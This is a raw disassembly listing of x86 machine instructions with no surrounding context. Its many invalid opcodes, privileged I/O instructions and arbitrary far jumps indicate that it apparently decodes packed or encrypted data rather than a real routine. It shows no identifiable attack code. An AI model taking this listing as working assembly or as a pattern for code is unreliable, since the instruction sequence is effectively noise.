  4215e5:	test   eax,0x2beaf7e8
  4215ea:	xchg   ecx,eax
  4215eb:	pop    ecx
  4215ec:	cmp    DWORD PTR [ebx],0xf56aa643
  4215f2:	(bad)  
  4215f3:	shr    edx,1
  4215f5:	(bad)  
  4215f6:	lods   eax,DWORD PTR ds:[esi]
  4215f7:	shl    BYTE PTR [esp+esi*2],cl
  4215fa:	and    ecx,ebp
  4215fc:	mov    edx,0x3c547bc
  421601:	pop    ebx
  421602:	or     al,0x83
  421604:	push   cs
  421605:	jge    0x421624
  421607:	ret    
  421608:	ret    0xc578
  42160b:	inc    DWORD PTR [esi-0xa821426]
  421611:	adc    edx,DWORD PTR [edi-0x35cb6222]
  421617:	xchg   edx,eax
  421618:	xor    BYTE PTR [eax-0x6a],dl
  42161b:	sti    
  42161c:	dec    esi
  42161d:	icebp  
  42161e:	cdq    
  42161f:	mov    bh,0x9e
  421621:	mov    edi,0x3a676d07
  421626:	jg     0x42161b
  421628:	bound  eax,QWORD PTR ds:0x3a014b0c
  42162e:	jmp    FWORD PTR [ecx+0x5be41695]
  421634:	imul   ebx,DWORD PTR [ecx+0x642d380d],0x5fdcec44
  42163e:	adc    al,al
  421640:	mov    edx,0xa7feaf4d
  421645:	out    dx,al
  421646:	cwde   
  421647:	outs   dx,BYTE PTR ds:[esi]
  421648:	fcomi  st,st(1)
  42164a:	(bad)  
  42164b:	ja     0x42167d
  42164d:	popa   
  42164e:	and    BYTE PTR [edi-0xf4dacb],al
  421654:	shl    BYTE PTR [edx+0x7cb7827],cl
  42165a:	jmp    0x1b94:0x80059297
  421661:	jne    0x4216b5
  421663:	sbb    al,0xdd
  421665:	add    al,0xfe
  421667:	rol    BYTE PTR [eax+0x782be64],0x7c
  42166e:	sub    al,0x7e
  421670:	jae    0x421658
  421672:	leave  
  421673:	pop    ds
  421674:	jmp    0x93c:0xd77fb696
  42167b:	dec    esi
  42167c:	mov    bh,0x5a
  42167e:	mov    ebp,DWORD PTR [eax+ebp*2]
  421681:	inc    eax
  421682:	es pop ds
  421684:	test   al,0x8e
  421686:	jnp    0x4216d1
  421688:	arpl   WORD PTR ds:0x6a67a986,dx
  42168e:	sti    
  42168f:	jns    0x4216c2
  421691:	jne    0x42168f
  421693:	movd   DWORD PTR [edi],mm4
  421696:	adc    ebx,DWORD PTR [edi+0x11589fbb]
  42169c:	outs   dx,DWORD PTR ds:[esi]
  42169d:	fadd   QWORD PTR [ecx-0x471a28e6]
  4216a3:	out    0x6e,eax
  4216a5:	rcr    BYTE PTR gs:[edi],1
  4216a8:	loop   0x421646
  4216aa:	lahf   
  4216ab:	add    DWORD PTR [ebx],edi
  4216ad:	and    dh,BYTE PTR ds:0x22bae185
  4216b3:	sti    
  4216b4:	sub    al,0xfd
  4216b6:	sub    al,0x6b
  4216b8:	and    esi,0xffffff91
  4216bb:	or     eax,0x75776e05
  4216c0:	(bad)  
  4216c1:	mov    esp,DWORD PTR [eax+edx*8+0x65]
  4216c5:	xor    al,0xc
  4216c7:	test   BYTE PTR [ebp+0x57],0x4d
  4216cb:	cmovbe esp,DWORD PTR [esi+edx*2+0x28]
  4216d0:	or     BYTE PTR [edx-0x53d334e8],ah
  4216d6:	mov    eax,ds:0x66631cdc
  4216db:	sub    al,0x86
  4216dd:	jle    0x421664
  4216df:	addr16 mul eax
  4216e2:	adc    ah,BYTE PTR [esi]
  4216e4:	xchg   ebp,eax
  4216e5:	int3   
  4216e6:	pusha  
  4216e7:	rcr    bl,0xe0
  4216ea:	mov    eax,ds:0x73e4c418
  4216ef:	rol    DWORD PTR [ebx],cl
  4216f1:	scas   al,BYTE PTR es:[edi]
  4216f2:	bound  ebp,QWORD PTR [eax-0x2eacbb35]
  4216f8:	inc    ebp
  4216f9:	add    eax,0x49b0db92
  4216fe:	fldenv [ecx+eax*4]
  421701:	pop    edi
  421702:	pop    ds
  421703:	sub    DWORD PTR [edi+ebx*2-0x71],ebp
  421707:	jmp    0x421722
  421709:	cmp    al,0xca
  42170b:	add    eax,0xca9612cd
  421710:	dec    esi
  421712:	test   eax,0x5e9ba0b1
  421717:	(bad)  
  421718:	shr    DWORD PTR [edi],1
  42171a:	push   eax
  42171b:	stos   BYTE PTR es:[edi],al
  42171c:	icebp  
  42171d:	push   esp
  42171e:	cmp    dl,bl
  421720:	arpl   WORD PTR [esi+ebp*8+0x7f9136c7],bp
  421727:	mov    al,0xb
  421729:	dec    esp
  42172a:	mov    ds:0xf0fe6093,al
  42172f:	sub    dh,al
  421731:	ja     0x42179d
  421733:	(bad)  
  421734:	jns    0x4217b2
  421736:	arpl   WORD PTR [ebx+0x5e],bp
  421739:	lock (bad) 
  42173b:	das    
  42173c:	mov    dh,0x49
  42173e:	(bad)  [edi-0x9]
  421741:	loopne 0x4216e4
  421743:	jmp    FWORD PTR [eax-0x59]
  421746:	push   0x44
  421748:	iret   
  421749:	sahf   
  42174a:	mov    al,0x5c
  42174c:	push   edi
  42174d:	or     DWORD PTR [eax+0xa22077d],eax
  421753:	sub    DWORD PTR [ebx+eiz*4],0x7ae185e7
  42175a:	add    dl,ch
  42175c:	mov    esi,0x6ca6dab2
  421761:	sbb    ah,al
  421763:	sahf   
  421764:	ds push esp
  421766:	scas   eax,DWORD PTR es:[edi]
  421767:	mov    edx,0x1719a778
  42176c:	out    dx,al
  42176d:	jecxz  0x42176e
  42176f:	sub    BYTE PTR [ecx+ebx*4],ah
  421772:	add    al,0x22
  421774:	gs cmp edi,eax
  421777:	sub    esi,ebp
  421779:	xor    BYTE PTR [ebp+0x34],bh
  42177c:	dec    esi
  42177d:	push   eax
  42177e:	add    dl,cl
  421780:	inc    eax
  421781:	loope  0x421786
  421783:	push   ss
  421784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421785:	inc    esp
  421786:	sbb    ebp,DWORD PTR [ecx]
  421788:	and    bh,BYTE PTR [ecx-0x67]
  42178b:	xchg   ecx,eax
  42178c:	ss jns 0x4217ea
  42178f:	cmp    BYTE PTR [edx+0x6d0a2de3],0x3d
  421796:	repnz xchg esi,eax
  421798:	fmul   QWORD PTR [esi+0x4693c0fc]
  42179e:	and    BYTE PTR [ebp-0x4753f31d],ah
  4217a4:	mov    ecx,0x69ef69d3
  4217a9:	repz retf 
  4217ab:	cmp    eax,DWORD PTR [esi-0x68]
  4217ae:	ins    BYTE PTR es:[edi],dx
  4217af:	sub    bh,BYTE PTR [eax-0x40a2b8aa]
  4217b5:	inc    eax
  4217b6:	push   0x55
  4217b8:	dec    esi
  4217b9:	inc    esp
  4217ba:	push   edx
  4217bb:	mov    esi,0xe1ead966
  4217c0:	jmp    0xded:0xbad79be6
  4217c7:	rcl    BYTE PTR [esi],0xf4
  4217ca:	pop    ss
  4217cb:	dec    ebx
  4217cc:	dec    ecx
  4217cd:	pop    es
  4217ce:	dec    eax
  4217cf:	call   0x1d1:0xb0a061d3
  4217d6:	out    0x9d,al
  4217d8:	jmp    0xe18fe2f4
  4217dd:	arpl   di,bp
  4217df:	iret   
  4217e0:	rol    BYTE PTR [eax-0x53],0x36
  4217e4:	jg     0x42183d
  4217e6:	icebp  
  4217e7:	sub    BYTE PTR [ecx+0x13],ah
  4217ea:	mov    BYTE PTR [edx-0x6601676e],cl
  4217f0:	jo     0x4217e4
  4217f2:	cmc    
  4217f3:	test   BYTE PTR [edi+ebp*2+0x661ae3a3],dh
  4217fa:	adc    al,0x49
  4217fc:	or     BYTE PTR [edx-0x2f],dh
  4217ff:	or     BYTE PTR [esi-0x42e4ee3c],ch
  421805:	pop    esp
  421806:	jle    0x4217b6
  421808:	shl    DWORD PTR [ebx],0xcc
  42180b:	pop    esp
  42180c:	cmp    cl,dh
  42180e:	jno    0x421859
  421810:	push   esi
  421811:	push   esi
  421812:	jmp    0xe58871ac
  421817:	inc    eax
  421818:	sub    al,0x25
  42181a:	daa    
  42181b:	scas   eax,DWORD PTR es:[edi]
  42181c:	repz pop es
  42181e:	fisttp WORD PTR [ecx-0x2ec659ab]
  421824:	loop   0x42188a
  421826:	pop    edx
  421827:	mov    ds:0x25cc637f,eax
  42182c:	cld    
  42182d:	push   eax
  42182e:	sub    DWORD PTR [eax-0x41],eax
  421831:	retf   0xdd5b
  421834:	xor    al,0x70
  421836:	and    edi,ebx
  421838:	mov    ebp,0xc65f9ab0
  42183d:	adc    DWORD PTR [edi],ebp
  42183f:	sbb    BYTE PTR [edx-0x1c18a7c0],dl
  421845:	fidivr DWORD PTR [edx-0x4f]
  421848:	sti    
  421849:	icebp  
  42184a:	mov    eax,ds:0xe3809002
  42184f:	and    dl,bl
  421851:	test   DWORD PTR [ebp-0x3a],ebx
  421854:	sub    al,0x6f
  421856:	jnp    0x421825
  421858:	mov    edi,0x124bfcdf
  42185d:	add    ebp,DWORD PTR ds:0x5fa013c8
  421863:	shr    BYTE PTR [ebp+0x3d725f51],cl
  421869:	icebp  
  42186a:	xchg   edi,eax
  42186b:	bound  edx,QWORD PTR [eax+0x7982e9bd]
  421871:	xchg   DWORD PTR [ebp+ecx*8-0x50a9cc13],ebp
  421878:	jno    0x421896
  42187a:	aam    0xd
  42187c:	mov    esi,0x6705b1b0
  421881:	(bad)  
  421882:	adc    cl,BYTE PTR ss:[esp+edi*4+0x2d84faad]
  42188a:	push   ebx
  42188b:	rcl    DWORD PTR [esi+0x185dc811],cl
  421891:	mov    WORD PTR [ebx+ecx*8+0x55060d3b],?
  421898:	inc    eax
  421899:	cmp    bl,BYTE PTR [esi]
  42189b:	jl     0x42190c
  42189d:	push   0xffffffd2
  42189f:	add    al,0xdc
  4218a1:	pop    ebx
  4218a2:	sti    
  4218a3:	sub    ecx,ebp
  4218a5:	xchg   esi,eax
  4218a6:	enter  0xe2a6,0x21
  4218aa:	leave  
  4218ab:	aad    0xd9
  4218ad:	fild   QWORD PTR [ebx]
  4218af:	shl    DWORD PTR ds:0x98acb84b,1
  4218b5:	mov    bl,0x61
  4218b7:	dec    esp
  4218b8:	jnp    0x4218dd
  4218ba:	sub    DWORD PTR [edx+0x752bb845],esp
  4218c0:	scas   eax,DWORD PTR es:[edi]
  4218c1:	dec    ecx
  4218c2:	rol    BYTE PTR [ebx+ebp*1-0x4eb6374],0xb3
  4218ca:	out    0x23,eax
  4218cc:	or     al,0x46
  4218ce:	sahf   
  4218cf:	mov    eax,ds:0x3aa29ff2
  4218d4:	mov    edi,0xc2627207
  4218d9:	jp     0x421925
  4218db:	pusha  
  4218dc:	mov    ecx,0x1da1c495
  4218e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218e2:	mov    edx,0xd5fec41f
  4218e7:	(bad)  
  4218e8:	mov    al,0x13
  4218ea:	dec    esi
  4218eb:	adc    ebp,edi
  4218ed:	fxam   
  4218ef:	ja     0x4218ae
  4218f1:	fdiv   QWORD PTR [edx]
  4218f3:	jns    0x421919
  4218f5:	dec    eax
  4218f6:	(bad)  
  4218f7:	outs   dx,BYTE PTR ds:[esi]
  4218f8:	in     eax,0xd
  4218fa:	aaa    
  4218fb:	sub    eax,0xe6a9eb7e
  421900:	dec    edi
  421901:	cli    
  421902:	dec    ebp
  421903:	xchg   edi,eax
  421904:	inc    esp
  421905:	daa    
  421906:	out    0xbf,al
  421908:	jge    0x4218bd
  42190a:	lods   eax,DWORD PTR ds:[esi]
  42190b:	fwait
  42190c:	sbb    eax,0x620495d3
  421911:	lods   al,BYTE PTR ds:[esi]
  421912:	ins    DWORD PTR es:[edi],dx
  421913:	(bad)
  421916:	pop    esp
  421917:	and    bh,ah
  421919:	adc    ebx,esp
  42191b:	jl     0x421992
  42191d:	xor    al,0xf8
  42191f:	mov    ah,0x6b
  421921:	and    eax,0x9ebf2e43
  421926:	in     al,0xf5
  421928:	push   ss
  421929:	jmp    0x3c830f78
  42192e:	add    ah,BYTE PTR [ecx-0x2e]
  421931:	mov    al,es:0x649c755
  421937:	sbb    BYTE PTR [edi+0x26aa489f],dh
  42193d:	out    dx,eax
  42193e:	lahf   
  42193f:	mov    bh,0xeb
  421941:	pop    esp
  421942:	jmp    0x42196e
  421944:	jmp    0x4218ed
  421946:	out    0x83,eax
  421948:	fist   DWORD PTR [edi]
  42194a:	loope  0x42190f
  42194c:	call   0x98c43964
  421951:	jle    0x4219b0
  421953:	repnz sbb eax,0x50db65eb
  421959:	hlt    
  42195a:	dec    edx
  42195c:	jmp    0x5930:0x2004be01
  421963:	mov    edi,0xf4b281c1
  421968:	loop   0x4219a3
  42196a:	pop    edx
  42196b:	cli    
  42196c:	adc    DWORD PTR [ebx-0x72],ecx
  42196f:	aaa    
  421970:	gs mov eax,fs:0xdb4c408
  421977:	xchg   edx,eax
  421978:	loopne 0x421961
  42197a:	mov    eax,0x26d3eea2
  42197f:	popa   
  421980:	push   eax
  421981:	arpl   WORD PTR [ebp+0x9e0b51c],bx
  421987:	and    esi,edx
  421989:	push   esi
  42198a:	mov    dh,0x66
  42198c:	pop    ebp
  42198d:	push   edx
  42198e:	sub    eax,0x387a27bc
  421993:	xor    al,0x7f
  421995:	popf   
  421996:	pushf  
  421997:	sar    DWORD PTR [ebp+0x366f0d8c],cl
  42199d:	push   cs
  42199e:	jae    0x4219c2
  4219a0:	sub    cl,BYTE PTR [eax+0x79669e5d]
  4219a6:	xchg   esi,eax
  4219a7:	mov    ds:0x7f89c612,al
  4219ac:	fwait
  4219ad:	mov    esp,0xd6c6ac26
  4219b2:	push   0xffffffd9
  4219b4:	loope  0x421a27
  4219b6:	bound  ebp,QWORD PTR [esi-0x33]
  4219b9:	push   ss
  4219ba:	ret    
  4219bb:	mov    bl,0xb
  4219bd:	fdiv   QWORD PTR [eax-0x49]
  4219c0:	stos   BYTE PTR es:[edi],al
  4219c1:	mov    ah,0x46
  4219c3:	cmp    DWORD PTR [ebx+ecx*8],ecx
  4219c6:	dec    eax
  4219c7:	cmc    
  4219c8:	(bad)  
  4219c9:	clc    
  4219ca:	mov    ebp,DWORD PTR [ecx+0x73]
  4219cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219ce:	repz xor al,0xec
  4219d1:	cmp    BYTE PTR [edi],ch
  4219d3:	or     eax,0xa1846288
  4219d8:	sahf   
  4219d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219da:	mov    bh,0x16
  4219dc:	dec    ecx
  4219dd:	jmp    DWORD PTR [edi+0xef44c0a]
  4219e3:	rcr    WORD PTR [ebp+esi*2-0x27fbd56f],1
  4219eb:	xor    BYTE PTR [esi+0x51],al
  4219ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219ef:	jns    0x421a5a
  4219f1:	or     al,ah
  4219f3:	xor    eax,0x55d0352c
  4219f8:	mov    ds,edi
  4219fa:	xchg   ecx,eax
  4219fb:	xchg   ebx,eax
  4219fc:	jb     0x4219b5
  4219fe:	jge    0x421a28
  421a00:	lahf   
  421a01:	popa   
  421a02:	jecxz  0x4219ae
  421a04:	mov    cl,0x5a
  421a06:	loop   0x421a05
  421a08:	sbb    al,0x87
  421a0a:	xor    ch,BYTE PTR [ecx+0x6f6c8a3e]
  421a10:	xlat   BYTE PTR fs:[ebx]
  421a12:	xor    eax,0x8fe4e992
  421a17:	out    dx,al
  421a18:	dec    ecx
  421a19:	sbb    DWORD PTR [esi],ebx
  421a1b:	adc    DWORD PTR [ecx],eax
  421a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a1e:	test   DWORD PTR [ecx+edi*4+0x6a],ecx
  421a22:	leave  
  421a23:	jne    0x421a92
  421a25:	mov    eax,DWORD PTR [eax-0x4f73c264]
  421a2b:	lahf   
  421a2c:	mov    DWORD PTR [esi+0x46],edx
  421a2f:	inc    ecx
  421a30:	mov    ebp,0x5e00ff08
  421a35:	pop    edx
  421a36:	pop    esi
  421a37:	loopne 0x421a0f
  421a39:	stos   BYTE PTR es:[edi],al
  421a3a:	mov    ds:0x16ad4c90,al
  421a40:	pop    ss
  421a41:	inc    edx
  421a42:	pusha  
  421a43:	pop    edi
  421a44:	ja     0x4219d1
  421a46:	jg     0x4219fc
  421a48:	mov    edx,0x3316e6b5
  421a4d:	jns    0x421ab8
  421a4f:	stos   DWORD PTR es:[edi],eax
  421a50:	jecxz  0x421a16
  421a52:	jp     0x421a14
  421a54:	aaa    
  421a55:	test   DWORD PTR [ebx-0x73477457],0x5fbec129
  421a5f:	and    BYTE PTR [ecx],dh
  421a61:	xor    dl,BYTE PTR [esi-0x467a6315]
  421a67:	xchg   edx,eax
  421a68:	mov    ecx,0xded9bfe2
  421a6d:	push   esp
  421a6e:	adc    BYTE PTR [eax+edi*4-0x3c],cl
  421a72:	into   
  421a73:	and    BYTE PTR [edx-0x2465a537],dh
  421a79:	xchg   esp,eax
  421a7a:	dec    edi
  421a7b:	lds    edi,FWORD PTR [ebx+0x7136db5b]
  421a81:	add    eax,0x4a036480
  421a86:	clc    
  421a87:	xchg   esp,eax
  421a88:	pushf  
  421a89:	dec    eax
  421a8a:	mov    al,0x9
  421a8c:	ds pop es
  421a8e:	aaa    
  421a8f:	push   ebx
  421a90:	xlat   BYTE PTR ds:[ebx]
  421a91:	mov    cl,BYTE PTR [esi+0x64]
  421a94:	xchg   esp,eax
  421a95:	into   
  421a96:	mov    ah,0x40
  421a98:	loope  0x421a1e
  421a9a:	(bad)  
  421a9c:	(bad)  
  421a9e:	rol    BYTE PTR [ecx],1
  421aa0:	clc    
  421aa1:	cmp    DWORD PTR [ebx-0x4ca563df],eax
  421aa7:	scas   al,BYTE PTR es:[edi]
  421aa8:	adc    cl,BYTE PTR [esi-0x7b]
  421aab:	sub    DWORD PTR [edx+0x5f],0xffffffac
  421aaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ab0:	cmp    DWORD PTR [ecx],esi
  421ab2:	cmp    eax,0x822802aa
  421ab7:	sbb    al,0x5d
  421ab9:	mov    edi,0xe5abd4e2
  421abe:	add    esp,DWORD PTR [ebx]
  421ac0:	jne    0x421acb
  421ac2:	or     esi,edx
  421ac4:	fwait
  421ac5:	mov    ah,0xc7
  421ac7:	test   DWORD PTR [ebx+0x73b30fdc],edx
  421acd:	pop    es
  421ace:	stos   BYTE PTR es:[edi],al
  421acf:	call   FWORD PTR [edi+edi*1-0x411c57ad]
  421ad6:	ds stos DWORD PTR es:[edi],eax
  421ad8:	pop    eax
  421ad9:	sahf   
  421ada:	shld   DWORD PTR [ebp+0xa],ecx,0x56
  421adf:	lock mov ebp,0x4ba3bcbf
  421ae5:	mov    al,ds:0xfe9e829b
  421aea:	jbe    0x421b69
  421aec:	ja     0x421b2a
  421aee:	loope  0x421b00
  421af0:	mov    esp,0x7e5ed9b7
  421af5:	jge    0x421afe
  421af7:	cmp    BYTE PTR [edx],dh
  421af9:	mov    bh,BYTE PTR [ecx+ebx*1-0x1f]
  421afd:	xor    DWORD PTR [ebp-0x1fe5713],ebx
  421b03:	xor    al,0x1a
  421b05:	and    al,0xa7
  421b07:	call   ebp
  421b09:	pop    ds
  421b0a:	mov    dl,0xa4
  421b0c:	pop    eax
  421b0d:	sti    
  421b0e:	xlat   BYTE PTR ds:[ebx]
  421b0f:	popaw  
  421b11:	mov    ecx,0xdbaf3588
  421b16:	mov    ?,WORD PTR [eax]
  421b18:	mov    al,0x52
  421b1a:	int3   
  421b1b:	jecxz  0x421b5c
  421b1d:	gs stc 
  421b1f:	sub    BYTE PTR [eax+0x7381c12b],bh
  421b25:	repz pop DWORD PTR [edx-0x9b1efba]
  421b2c:	jo     0x421b1f
  421b2e:	dec    eax
  421b2f:	mov    eax,cr4
  421b32:	test   eax,0x8dd7fee5
  421b37:	or     esi,esi
  421b39:	cmp    DWORD PTR [ebp+0xe],esp
  421b3c:	mov    ch,0x3
  421b3e:	jno    0x421b86
  421b40:	mov    cl,0x2d
  421b42:	sahf   
  421b43:	outs   dx,DWORD PTR ds:[esi]
  421b44:	stc    
  421b45:	or     al,bh
  421b47:	adc    dh,BYTE PTR [esi-0x2e7244ed]
  421b4d:	and    al,0x80
  421b4f:	cmp    esi,DWORD PTR [ebx+edi*4]
  421b52:	mov    eax,ds:0x4a0d953e
  421b57:	cli    
  421b58:	call   0x64991939
  421b5d:	fld    DWORD PTR [esi-0x72f27f4d]
  421b63:	inc    esi
  421b64:	and    DWORD PTR [eax],eax
  421b66:	mov    edi,0x163d555e
  421b6b:	sbb    BYTE PTR [edx+0x34],bl
  421b6e:	pop    ebx
  421b6f:	cmp    BYTE PTR [eax-0x7d],cl
  421b72:	dec    edi
  421b73:	inc    ebp
  421b74:	test   edi,ecx
  421b76:	stos   DWORD PTR es:[edi],eax
  421b77:	repnz dec esi
  421b79:	call   0xc67d:0x313cae79
  421b80:	xor    bl,0x3c
  421b83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b84:	or     eax,0x2552aac7
  421b89:	enter  0xaa9d,0x30
  421b8d:	stos   BYTE PTR es:[edi],al
  421b8e:	in     eax,0xb3
  421b90:	lods   al,BYTE PTR ds:[esi]
  421b91:	icebp  
  421b92:	dec    edx
  421b93:	and    BYTE PTR [edx+eax*4+0x42a8abef],ah
  421b9a:	hlt    
  421b9b:	and    eax,0x576eb76f
  421ba0:	outs   dx,DWORD PTR ds:[esi]
  421ba1:	inc    edi
  421ba2:	inc    eax
  421ba3:	pop    edi
  421ba4:	scas   eax,DWORD PTR es:[edi]
  421ba5:	hlt    
  421ba6:	mov    bh,0xab
  421ba8:	fdiv   st(1),st
  421baa:	fbld   TBYTE PTR [ebp-0x23]
  421bad:	dec    ebx
  421bae:	sub    ch,BYTE PTR [esi]
  421bb0:	xor    eax,0xa7c7e00d
  421bb5:	test   bl,dh
  421bb7:	or     dh,BYTE PTR [eax]
  421bb9:	dec    ecx
  421bba:	dec    ebx
  421bbb:	test   BYTE PTR [ecx-0x87dc78e],dh
  421bc1:	aad    0x4f
  421bc3:	mov    eax,ds:0x82fc13d4
  421bc8:	mov    eax,0x3fde99e9
  421bcd:	popa   
  421bce:	mov    ch,0xa9
  421bd0:	popa   
  421bd1:	mov    esi,0xebe8bda1
  421bd6:	bnd ret 
  421bd8:	mov    ah,0x9f
  421bda:	pop    esi
  421bdb:	arpl   di,si
  421bdd:	leave  
  421bde:	aas    
  421bdf:	lds    edx,FWORD PTR [ebx+0x45]
  421be2:	jne    0x421bc3
  421be4:	mov    ecx,0xef19ae6c
  421be9:	loopne 0x421bd1
  421beb:	ss jge 0x421b76
  421bee:	in     ax,0xe2
  421bf1:	mov    ah,0x7f
  421bf3:	dec    esi
  421bf4:	mov    cl,0xa7
  421bf6:	sbb    eax,0xf841cff8
  421bfb:	loop   0x421c4a
  421bfd:	inc    edi
  421bfe:	sub    DWORD PTR [ecx+eax*8],esi
  421c01:	add    DWORD PTR [eax],0x0
  421c07:	add    BYTE PTR [eax],al
  421c09:	add    BYTE PTR [esi+0x43],dl
  421c0c:	pop    edx
  421c0d:	pop    ecx
  421c0e:	pop    edi
  421c0f:	pop    ecx
  421c10:	push   edi
  421c11:	dec    edi
  421c12:	mov    fs,WORD PTR [ecx+0x71eae972]
  421c18:	mov    eax,ds:0x1aad01e
  421c1d:	add    BYTE PTR [eax-0xdfffffa],al
  421c23:	mov    ecx,0xa58846a8
  421c28:	cmp    ch,0x34
  421c2b:	loopne 0x421c29
  421c2d:	enter  0x62ba,0x9b
  421c31:	mov    ebx,DWORD PTR [eax+0x14]
  421c34:	fwait
  421c35:	jp     0x421c66
  421c37:	dec    ecx
  421c38:	jo     0x421bfb
  421c3a:	push   edi
  421c3b:	cmp    eax,0x408d7124
  421c40:	out    0xa4,eax
  421c42:	mov    esp,0x523299fc
  421c47:	xchg   DWORD PTR [ecx],ebx
  421c49:	jb     0x421c56
  421c4b:	mov    ecx,DWORD PTR [eax-0x7afb7354]
  421c51:	xchg   edx,eax
  421c52:	sub    ah,BYTE PTR [edx-0x6e]
  421c55:	stos   BYTE PTR es:[edi],al
  421c56:	dec    esi
  421c57:	push   ebx
  421c58:	sbb    edx,DWORD PTR [edx-0x6]
  421c5b:	and    ch,BYTE PTR [ebp+edx*4+0x7d1866f4]
  421c62:	sti    
  421c63:	int    0x6
  421c65:	push   eax
  421c66:	and    esi,DWORD PTR [ebx+0x6fab8a5e]
  421c6c:	sub    cl,dl
  421c6e:	pop    edx
  421c6f:	jl     0x421c1b
  421c71:	pop    eax
  421c72:	adc    ebx,DWORD PTR [esi+0x5c8424de]
  421c78:	test   al,0x73
  421c7a:	stc    
  421c7b:	mov    eax,0xd2aeb747
  421c80:	lock mov ah,BYTE PTR [ebx+0x64]
  421c84:	cmp    eax,0x4f695b03
  421c89:	js     0x421c16
  421c8b:	adc    esi,esp
  421c8d:	xor    al,0x4d
  421c8f:	dec    ebx
  421c90:	xchg   ebp,eax
  421c91:	push   0xffffffb9
  421c93:	add    al,ch
  421c95:	inc    BYTE PTR [edi-0x65]
  421c98:	push   esp
  421c99:	sub    ebp,DWORD PTR [ecx]
  421c9b:	aaa    
  421c9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c9d:	loope  0x421cbd
  421c9f:	jl     0x421cf5
  421ca1:	in     eax,dx
  421ca2:	mov    cl,0x37
  421ca4:	mov    al,0x6a
  421ca6:	scas   eax,DWORD PTR es:[edi]
  421ca7:	aas    
  421ca8:	push   eax
  421ca9:	xchg   esp,eax
  421caa:	jae    0x421c76
  421cac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cad:	mov    dh,0x87
  421caf:	mov    bh,0xc0
  421cb1:	out    dx,eax
  421cb2:	inc    edi
  421cb3:	sbb    al,0x49
  421cb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cb6:	clc    
  421cb7:	and    DWORD PTR [ebx+0x19e1a0e9],esi
  421cbd:	stc    
  421cbe:	retf   0x82d1
  421cc1:	push   edi
  421cc2:	ret    0x3903
  421cc5:	test   al,0xbc
  421cc7:	das    
  421cc8:	jg     0x421d1f
  421cca:	add    bl,al
  421ccc:	jae    0x421c9f
  421cce:	mov    edx,0x90d909e9
  421cd3:	push   es
  421cd4:	xchg   esp,eax
  421cd5:	test   al,0x7f
  421cd7:	adc    esi,DWORD PTR [edx]
  421cd9:	push   ss
  421cda:	lods   eax,DWORD PTR ds:[esi]
  421cdb:	scas   eax,DWORD PTR es:[edi]
  421cdc:	jg     0x421c9f
  421cde:	leave  
  421cdf:	jnp    0x421c8f
  421ce1:	std    
  421ce2:	or     eax,0xa1e7a13b
  421ce7:	push   ds
  421ce8:	pusha  
  421ce9:	jp     0x421cf0
  421ceb:	aam    0xf1
  421ced:	std    
  421cee:	dec    esp
  421cef:	or     cl,BYTE PTR [ecx]
  421cf1:	cmp    al,0x1a
  421cf3:	mov    bh,0xe9
  421cf5:	inc    esp
  421cf6:	loopne 0x421c84
  421cf8:	sub    al,0xc2
  421cfa:	pop    ds
  421cfb:	pop    esp
  421cfc:	in     al,0xf3
  421cfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cff:	push   esi
  421d00:	push   es
  421d01:	and    cl,ah
  421d03:	mov    eax,0xf315431a
  421d08:	push   esp
  421d09:	in     al,0x91
  421d0b:	inc    esp
  421d0c:	ss data16 in al,0x96
  421d10:	sbb    eax,0x6acd8a65
  421d15:	int    0xa7
  421d17:	xchg   edx,eax
  421d18:	inc    esi
  421d19:	dec    esi
  421d1a:	mov    al,0xb4
  421d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d1d:	adc    al,0xe3
  421d1f:	ja     0x421ca2
  421d21:	xchg   ebp,eax
  421d22:	mov    al,0x17
  421d24:	popf   
  421d25:	js     0x421d3b
  421d27:	arpl   WORD PTR es:[ecx+0x2329b85e],bp
  421d2e:	std    
  421d2f:	in     eax,0xa
  421d31:	cs stos DWORD PTR es:[edi],eax
  421d33:	push   ebp
  421d34:	sub    DWORD PTR [edi],0x93029ff7
  421d3a:	mov    al,0x6d
  421d3c:	pop    ds
  421d3d:	xchg   esi,eax
  421d3e:	dec    ebp
  421d3f:	inc    edi
  421d40:	push   cs
  421d41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d42:	xchg   ebp,eax
  421d43:	xchg   BYTE PTR ds:0xf73bd33b,bh
  421d49:	mov    bh,0xf8
  421d4b:	push   ebx
  421d4c:	sbb    DWORD PTR [ecx],edx
  421d4e:	rol    DWORD PTR [eax+0x3d],cl
  421d51:	xor    eax,0x9f8544d8
  421d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d57:	cmp    edx,DWORD PTR [esp+ebx*1]
  421d5a:	iret   
  421d5b:	mov    bh,0xe8
  421d5d:	pop    ds
  421d5e:	xor    eax,0x3fc26bab
  421d63:	add    DWORD PTR [eax+ebx*4-0x5f],edx
  421d67:	adc    BYTE PTR [edx],ah
  421d69:	lock cs pop es
  421d6c:	mov    bl,BYTE PTR [ebx+0x62]
  421d6f:	jnp    0x421d58
  421d71:	pop    edx
  421d72:	jne    0x421d94
  421d74:	loop   0x421d0a
  421d76:	leave  
  421d77:	inc    ebx
  421d78:	into   
  421d79:	mov    ds,WORD PTR [eax+0x6a]
  421d7c:	push   es
  421d7d:	push   eax
  421d7e:	and    esi,DWORD PTR [edi]
  421d80:	(bad)  
  421d81:	clc    
  421d82:	into   
  421d83:	and    esp,DWORD PTR [edx]
  421d85:	xor    eax,0xb8648431
  421d8a:	imul   eax,DWORD PTR [edi],0x901e671b
  421d90:	test   al,0x2a
  421d92:	test   al,0x41
  421d94:	outs   dx,BYTE PTR ds:[esi]
  421d95:	push   esp
  421d96:	in     al,0xe9
  421d98:	mov    ebp,0x96c8d87c
  421d9d:	jb     0x421d68
